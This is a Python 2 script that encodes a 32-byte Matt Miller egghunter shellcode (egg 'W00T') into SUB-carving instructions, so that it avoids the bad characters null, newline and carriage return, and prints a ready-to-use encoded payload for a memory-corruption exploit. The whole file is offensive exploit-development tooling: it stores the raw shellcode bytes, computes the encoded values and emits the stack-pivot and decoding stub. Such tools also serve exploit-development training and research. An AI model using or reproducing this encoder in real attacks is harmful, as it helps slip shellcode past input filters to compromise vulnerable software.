#!/usr/bin/python

######################################################################################
# Manul encoding script for carving 32 byte Matt Miller egghunter shellcode into EAX #
# Egg = 'W00T'                                                                       #
# Non-encoded shellcode:                                                             #
# \x66\x81\xca\xff\x0f\x42\x52\x6a                                                   #
# \x02\x58\xcd\x2e\x3c\x05\x5a\x74                                                   #
# \xef\xb8\x54\x30\x30\x57\x8b\xfa                                                   #
# \xaf\x75\xea\xaf\x75\xe7\xff\xe7                                                   #
######################################################################################

import sys
import os
from random import choice

#Define bad characters here
badChar=[0x00, 0x0a, 0x0d]

#All possible hex characters
allChar =[0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
          0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
          0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
          0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b,
          0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,
          0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41,
          0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c,
          0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
          0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62,
          0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d,
          0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
          0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82, 0x83,
          0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e,
          0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99,
          0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4,
          0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf,
          0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba,
          0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5,
          0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0,
          0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb,
          0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6,
          0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1,
          0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc,
          0xfd, 0xfe, 0xff]

#Define usable characters based on bad characters
goodChar=[]
for value in allChar:
    if value not in badChar:
        goodChar.append(hex(value))

#Target values and corresponding shellcode
#\xe7\xff\xe7\x75
set1=int("1800188b", base=16)
#\xaf\xea\x75\xaf
set2=int("50158a51", base=16)
#\xfa\x8b\x57\x30
set3=int("0574a8a0", base=16)
#\x30\x54\xb8\xef
set4=int("cfab4711", base=16)
#\x74\x5a\x05\x3c
set5=int("8ba5fac4", base=16)
#\x2e\xcd\x58\x02
set6=int("d132a7fe", base=16)
#\x6a\x52\x42\x0f
set7=int("95adbdf1", base=16)
#\xff\xca\x81\x66
set8=int("00357e9a", base=16)

def encodeSet1(x):
    k = str(hex(x))[2:99].strip("L")
    k = "0" * (8-len(k)) + k

    #print "starting value is: " + k

    a = (k[6] + k[7]) + (k[4] + k[5]) + (k[2] + k[3]) + (k[0] + k[1])

    #print "Organized value is: " + a

    a1 = a[0:2]
    a2 = a[2:4]
    a3 = a[4:6]  #edge case with x00. Need to subtract from 100
    a4 = a[6:8]  #edge case. Need to subtract an extra 1 due to carry

    #print "First byte= " + a1
    #print "Second byte= " + a2
    #print "Third byte= " + a3
    #print "Fourth byte= " + a4

    row1 = int(a1,16)
    while row1 !=0:
        try:
            b1 = choice(goodChar)
            c1 = choice(goodChar)
            d1 = choice(goodChar)

            if (int(a1,16) - int(b1,16) - int(c1,16) - int(d1,16) == 0):
                #print (b1,c1,d1)
                break

        except:
            print "Something went wrong for row1"

    row2 = int(a2,16)
    while row2 !=0:
        try:
            b2 = choice(goodChar)
            c2 = choice(goodChar)
            d2 = choice(goodChar)

            if (int(a2,16) - int(b2,16) - int(c2,16) - int(d2,16) == 0):
                #print (b2,c2,d2)
                break

        except:
            print "Something went wrong for row2"

    row3 = int("100",16)
    while row3 !=0:
        try:
            b3 = choice(goodChar)
            c3 = choice(goodChar)
            d3 = choice(goodChar)

            if (int("100",16) - int(b3,16) - int(c3,16) - int(d3,16) == 0):
                #print (b3,c3,d3)
                break

        except:
            print "Something went wrong for row3"

    row4 = int(a4,16)
    while row4 !=1:
        try:
            b4 = choice(goodChar)
            c4 = choice(goodChar)
            d4 = choice(goodChar)

            if (int(a4,16) - int(b4,16) - int(c4,16) - int(d4,16) == 1):
                #print (b4,c4,d4)
                break

        except:
            print "Something went wrong"

    print "\"\\x2d" + padAndStrip(b1) + padAndStrip(b2) + padAndStrip(b3) + padAndStrip(b4) + "\""
    print "\"\\x2d" + padAndStrip(c1) + padAndStrip(c2) + padAndStrip(c3) + padAndStrip(c4) + "\""
    print "\"\\x2d" + padAndStrip(d1) + padAndStrip(d2) + padAndStrip(d3) + padAndStrip(d4) + "\""

def encodeNorm(x):
    k = str(hex(x))[2:99].strip("L")
    k = "0" * (8-len(k)) + k

    #print "starting value is: " + k

    a = (k[6] + k[7]) + (k[4] + k[5]) + (k[2] + k[3]) + (k[0] + k[1])

    #print "Organized value is: " + a

    a1 = a[0:2]
    a2 = a[2:4]
    a3 = a[4:6]
    a4 = a[6:8]

    #print "First byte= " + a1
    #print "Second byte= " + a2
    #print "Third byte= " + a3
    #print "Fourth byte= " + a4

    row1 = int(a1,16)
    while row1 !=0:
        try:
            b1 = choice(goodChar)
            c1 = choice(goodChar)
            d1 = choice(goodChar)

            if (int(a1,16) - int(b1,16) - int(c1,16) - int(d1,16) == 0):
                #print (b1,c1,d1)
                break

        except:
            print "Something went wrong for row1"

    row2 = int(a2,16)
    while row2 !=0:
        try:
            b2 = choice(goodChar)
            c2 = choice(goodChar)
            d2 = choice(goodChar)

            if (int(a2,16) - int(b2,16) - int(c2,16) - int(d2,16) == 0):
                #print (b2,c2,d2)
                break

        except:
            print "Something went wrong for row2"

    row3 = int(a3,16)
    while row3 !=0:
        try:
            b3 = choice(goodChar)
            c3 = choice(goodChar)
            d3 = choice(goodChar)

            if (int(a3,16) - int(b3,16) - int(c3,16) - int(d3,16) == 0):
                #print (b3,c3,d3)
                break

        except:
            print "Something went wrong for row3"

    row4 = int(a4,16)
    while row4 !=0:
        try:
            b4 = choice(goodChar)
            c4 = choice(goodChar)
            d4 = choice(goodChar)

            if (int(a4,16) - int(b4,16) - int(c4,16) - int(d4,16) == 0):
                #print (b4,c4,d4)
                break

        except:
            print "Something went wrong"

    print "\"\\x2d" + padAndStrip(b1) + padAndStrip(b2) + padAndStrip(b3) + padAndStrip(b4) + "\""
    print "\"\\x2d" + padAndStrip(c1) + padAndStrip(c2) + padAndStrip(c3) + padAndStrip(c4) + "\""
    print "\"\\x2d" + padAndStrip(d1) + padAndStrip(d2) + padAndStrip(d3) + padAndStrip(d4) + "\""


def encodeSet8(x):
    k = str(hex(x))[2:99].strip("L")
    k = "0" * (8-len(k)) + k

    #print "starting value is: " + k

    a = (k[6] + k[7]) + (k[4] + k[5]) + (k[2] + k[3]) + (k[0] + k[1])

    #print "Organized value is: " + a

    a1 = a[0:2]
    a2 = a[2:4]
    a3 = a[4:6] #edge case: Need to add 100 to make 0
    a4 = a[6:8] #edge case: Need to end up with 1

    #print "First byte= " + a1
    #print "Second byte= " + a2
    #print "Third byte= " + a3
    #print "Fourth byte= " + a4

    row1 = int(a1,16)
    while row1 !=0:
        try:
            b1 = choice(goodChar)
            c1 = choice(goodChar)
            d1 = choice(goodChar)

            if (int(a1,16) - int(b1,16) - int(c1,16) - int(d1,16) == 0):
                #print (b1,c1,d1)
                break

        except:
            print "Something went wrong for row1"

    row2 = int(a2,16)
    while row2 !=0:
        try:
            b2 = choice(goodChar)
            c2 = choice(goodChar)
            d2 = choice(goodChar)

            if (int(a2,16) - int(b2,16) - int(c2,16) - int(d2,16) == 0):
                #print (b2,c2,d2)
                break

        except:
            print "Something went wrong for row2"

    row3 = int(a3,16)
    while row3 !=0:
        try:
            b3 = choice(goodChar)
            c3 = choice(goodChar)
            d3 = choice(goodChar)

            if (int(a3,16) - int(b3,16) - int(c3,16) - int(d3,16) + int("100",16) == 0):
                #print (b3,c3,d3)
                break

        except:
            print "Something went wrong for row3"

    row4 = int("100",16)
    while row4 !=1:
        try:
            b4 = choice(goodChar)
            c4 = choice(goodChar)
            d4 = choice(goodChar)

            if (int("100",16) - int(b4,16) - int(c4,16) - int(d4,16) == 1):
                #print (b4,c4,d4)
                break

        except:
            print "Something went wrong"

    print "\"\\x2d" + padAndStrip(b1) + padAndStrip(b2) + padAndStrip(b3) + padAndStrip(b4) + "\""
    print "\"\\x2d" + padAndStrip(c1) + padAndStrip(c2) + padAndStrip(c3) + padAndStrip(c4) + "\""
    print "\"\\x2d" + padAndStrip(d1) + padAndStrip(d2) + padAndStrip(d3) + padAndStrip(d4) + "\""


def padAndStrip(byte):
    address = str.format('\\x{:02x}', int(byte,16))
    return address

#To do: create actual function to grab values from goodChar
#and remove hardcoded AND values in case the characters used below are bad.
def zeroEax():
    #If XOR EAX,EAX cannot be used due to bad characters, use AND
    if 0x33 in badChar or 0xc0 in badChar:
        print "\"\\x25\\x4a\\x4d\\x4e\\x55\""
        print "\"\\x25\\x35\\x32\\x31\\x2a\""

    #XOR EAX,EAX
    else:
        print "\"\\x33\\xc0\""


def genShellcode():
    print "egghunter = ("
    zeroEax()
    print "\"\\x54\\x58\"\n" #PUSH ESP  POP EAX
    print "\"\\x2d\\x66\\x4d\\x55\\x55\""   #Add the
    print "\"\\x2d\\x66\\x4b\\x55\\x55\""   #target address
    print "\"\\x2d\\x6a\\x50\\x55\\x55\""   #where decoding will start
    print "\"\\x50\"" #PUSH EAX
    print "\"\\x5c\"" #POP ESP
    zeroEax()
    encodeSet1(set1)
    print "\"\\x50\""
    zeroEax()
    encodeNorm(set2)
    print "\"\\x50\""
    zeroEax()
    encodeNorm(set3)
    print "\"\\x50\""
    zeroEax()
    encodeNorm(set4)
    print "\"\\x50\""
    zeroEax()
    encodeNorm(set5)
    print "\"\\x50\""
    zeroEax()
    encodeNorm(set6)
    print "\"\\x50\""
    zeroEax()
    encodeNorm(set7)
    print "\"\\x50\""
    zeroEax()
    encodeSet8(set8)
    print "\"\\x50\")"

if __name__== "__main__":
    genShellcode()
